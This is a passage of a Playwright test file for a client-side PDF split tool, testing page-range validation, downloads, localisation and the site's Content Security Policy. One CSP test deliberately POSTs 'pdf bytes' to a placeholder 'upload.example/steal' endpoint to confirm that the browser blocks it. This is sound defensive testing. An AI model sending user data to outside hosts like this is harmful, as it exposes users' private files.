    await page.getByRole('button', { name: 'Split', exact: false }).first().click();
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('9');
    await page.getByRole('button', { name: 'Split & download' }).click();
    await expect(page.getByRole('alert')).toContainText('“9” is outside 1–5.');
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('1-2, 3-');

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Split & download' }).click();
    const file = await download;
    expect(file.suggestedFilename()).toBe('merged-split.zip');
    expect(Object.keys(unzipSync(await downloadBytes(file)))).toEqual(['merged-01_p1-2.pdf', 'merged-02_p3-5.pdf']);

    await page.getByRole('button', { name: 'Deutsch' }).click();
    await expect(page.getByText('5 Seiten aus 2 Dateien')).toBeVisible();
  });

  test.describe('with an English browser', () => {
    test.use({ locale: 'en-US' });

    test('starts in English', async ({ app: page }) => {
      await expect(page.getByText('Nothing is uploaded')).toBeVisible();
      await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    });
  });

  test.describe('with a browser in another language', () => {
    test.use({ locale: 'fr-FR' });

    test('falls back to English', async ({ app: page }) => {
      await expect(page.getByRole('button', { name: 'Choose PDF' })).toBeVisible();
    });
  });
});

// These tests provoke a blocked request on purpose, so they do not use the `app` fixture.
base.describe('content security policy', () => {
  base('is part of the page and allows connections to the own origin only', async ({ page }) => {
    await page.goto('/');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toContain('unsafe-inline');
    expect(csp).not.toMatch(/'unsafe-eval'/);

    // The headers file for the host carries the same policy and the usual hardening headers.
    const headers = await readFile(new URL('../../dist/_headers', import.meta.url), 'utf8');
    expect(headers).toContain(`Content-Security-Policy: ${csp}; frame-ancestors 'none'`);
    expect(headers).toContain('X-Content-Type-Options: nosniff');
    expect(headers).toContain('Referrer-Policy: no-referrer');
  });

  base('makes the browser itself refuse to send data to another server', async ({ page, context }) => {
    // Should the policy ever fail, the request still must not reach the internet.
    let reachedNetwork = false;
    await context.route('https://upload.example/**', (route) => {
      reachedNetwork = true;
      return route.abort();
    });
    await page.goto('/');
    const result = await page.evaluate(async () => {
      const violation = new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (e) => resolve(e.effectiveDirective), { once: true }),
      );
      const sent = await fetch('https://upload.example/steal', { method: 'POST', body: 'pdf bytes' }).then(
        () => true,
        () => false,
      );
      return { sent, directive: await violation };
    });
    expect(result).toEqual({ sent: false, directive: 'connect-src' });
    expect(reachedNetwork).toBe(false);
  });
});
